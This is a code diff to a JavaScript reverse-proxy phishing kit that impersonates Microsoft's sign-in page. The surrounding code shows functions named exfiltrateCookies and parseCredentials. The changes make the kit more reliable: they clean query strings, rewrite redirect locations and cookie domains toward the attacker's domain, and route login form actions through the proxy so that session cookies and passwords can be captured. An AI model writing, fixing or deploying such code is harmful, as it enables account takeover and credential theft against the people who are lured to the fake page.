@@ -70,7 +70,34 @@ async function exfiltrateCookies(cookieText, ip, platform, url) {
   } catch (e) {}
 }
 
-function getUpstreamInfo(pathname) {
+// CRITICAL FIX: Properly clean query strings by removing ALL path parameters
+function cleanQueryString(search) {
+  if (!search) return '';
+  
+  const params = new URLSearchParams(search);
+  
+  // Remove ALL path parameters - they should never reach upstream
+  let modified = false;
+  while (params.has('path')) {
+    params.delete('path');
+    modified = true;
+  }
+  
+  // Also remove any empty or undefined values
+  for (const [key, value] of params) {
+    if (!value || value === 'undefined' || value === 'null') {
+      params.delete(key);
+    }
+  }
+  
+  const result = params.toString();
+  return result ? '?' + result : '';
+}
+
+function getUpstreamInfo(pathname, search) {
+  // Clean the search string immediately
+  const cleanSearch = cleanQueryString(search);
+
   if (pathname.startsWith(PROXY_PREFIX)) {
     const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
     const firstSlash = withoutPrefix.indexOf('/');
@@ -92,6 +119,7 @@ function getUpstreamInfo(pathname) {
       upstream: upstreamDomain,
       type: provider ? provider.type : 'unknown',
       path: upstreamPath,
+      search: cleanSearch,
       isProxied: true
     };
   }
@@ -100,6 +128,7 @@ function getUpstreamInfo(pathname) {
     upstream: INITIAL_UPSTREAM,
     type: 'microsoft',
     path: pathname,
+    search: cleanSearch,
     isProxied: false
   };
 }
@@ -117,23 +146,19 @@ function shouldProxyDomain(hostname) {
   return false;
 }
 
-// CRITICAL FIX: Use simple domain replacement like working snippet
+// CRITICAL FIX: Use simple domain replacement and clean query strings in redirects
 function rewriteLocation(location) {
   try {
     const url = new URL(location);
     
     if (shouldProxyDomain(url.hostname)) {
-      // Simple approach: replace domain with proxy domain + prefix + original domain
-      // Instead of complex URL building that can mangle paths
       const originalHostname = url.hostname;
-      const newHostname = YOUR_DOMAIN;
+      
+      // CRITICAL: Clean the search string in redirects too
+      const cleanSearch = cleanQueryString(url.search);
       
       // Build new URL by replacing just the hostname part
-      let newUrl = location.replace(originalHostname, `${newHostname}${PROXY_PREFIX}${originalHostname}`);
-      
-      // Fix any double protocol issues that might occur
-      newUrl = newUrl.replace(/https:\/\/https:\/\//g, 'https://');
-      newUrl = newUrl.replace(/https:\/\/http:\/\//g, 'https://');
+      let newUrl = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${originalHostname}${url.pathname}${cleanSearch}`;
       
       return newUrl;
     }
@@ -172,7 +197,6 @@ function parseCredentials(bodyText) {
   return { user, pass };
 }
 
-// Minimal interceptor
 function generateInterceptorScript(upstreamDomain, currentPath) {
   const basePath = currentPath.replace(/\/[^\/]*$/, '/');
   return `<script>(function(){
@@ -193,10 +217,12 @@ export default async function handleRequest(request) {
     return new Response('Access denied.', { status: 403 });
   }
 
-  const info = getUpstreamInfo(url.pathname);
+  // CRITICAL FIX: Pass both pathname and search to getUpstreamInfo
+  const info = getUpstreamInfo(url.pathname, url.search);
   const upstreamDomain = info.upstream;
-  const upstreamPath = info.path + url.search;
-  const upstreamUrl = 'https://' + upstreamDomain + upstreamPath;
+  
+  // CRITICAL FIX: Use info.search (cleaned) not url.search (raw)
+  const upstreamUrl = 'https://' + upstreamDomain + info.path + info.search;
   
   console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}`);
 
@@ -284,12 +310,10 @@ export default async function handleRequest(request) {
       cookies.forEach(cookie => {
         if (!cookie) return;
         
-        // CRITICAL FIX: Use simple string replacement like working snippet
-        // Replace only the domain, preserve everything else exactly
+        // Simple string replacement like working snippet
         let modifiedCookie = cookie;
         
         // Replace upstream domain with proxy domain prefix pattern
-        // login.microsoftonline.com -> ayola-ozamu.zeabur.app/_p/login.microsoftonline.com
         modifiedCookie = modifiedCookie.replace(
           new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g'), 
           `${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}`
@@ -329,11 +353,8 @@ export default async function handleRequest(request) {
         if (!text.includes(script)) text = script + text;
       }
 
-      // CRITICAL FIX: Use simple global replacement like working snippet
-      // This is safer than complex regex that can mangle URLs
+      // Simple string replacement like working snippet
       Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
-        // Simple string replacement - replaces all occurrences
-        // This matches the working snippet's approach exactly
         const replacement = `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`;
         text = text.split(domain).join(replacement);
       });
@@ -347,7 +368,7 @@ export default async function handleRequest(request) {
           return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
         });
         
-        // Form actions - handle full URLs first (already replaced above), then relative
+        // Form actions
         text = text.replace(/action="\/([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
         text = text.replace(/action="(?!\/|https?:|#|data:)([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${currentDir}$1"`);
         
